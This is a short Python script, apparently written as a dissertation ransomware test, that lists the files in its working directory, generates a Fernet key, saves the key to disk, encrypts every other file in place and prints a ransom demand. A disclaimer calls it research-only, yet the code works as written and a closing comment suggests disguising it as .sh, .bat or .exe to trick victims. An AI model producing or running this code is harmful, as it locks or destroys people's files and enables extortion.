#!/usr/bin/env python3
# F20PA Dissertation Ransomware Test
# **NOTE** THIS IS ONLY FOR DOCUMENTATION AND RESEARCH PURPOSES. THIS CODE SHALL NOT BE USED FOR PERSONAL USE OR MALICIOUS INTENTIONS INORDER TO MEET ETHICAL REQUIREMENTS. PLEASE DO NOT USE TRY THIS
# Owner: apv2@hw.ac.uk Aswin Valsalan 

import os
from cryptography.fernet import Fernet 


# This code is used to find the files in the directory/OS to hold ransom. Also to exclude which attacker needs to access.
files = []

for file in os.listdir():
      if file == "apvware.py" or file == "apv.key" or file == "apvrelease.py":
             continue
      if os.path.isfile(file):
            files.append(file)
      
print(files)

# This will generate a key using Fernet which will be used to encrypt files to hold ransom.
key = Fernet.generate_key()
with open("apv.key", "wb") as apv:
        apv.write(key)


# This is main body code which will use the key to encrypt and lock out potential victim holding them ransom.
# The key is hidden and seen only to the attacker and is needed to decrypt the files after ransom met.   
for file in files:
        with open(file, "rb") as apvfile:
                contents = apvfile.read()
        contents_secured = Fernet(key).encrypt(contents)
        with open(file, "wb") as apvfile:
                apvfile.write(contents_secured)
                
print("YOUR FILES HAVE BEEN HACKED AND LOCKED BY US , GIVE US WHAT WE WANT AND GET IT BACK NOW")

# This is just a basic ransomware which can be ran as .sh , .bat or .exe to trick victim
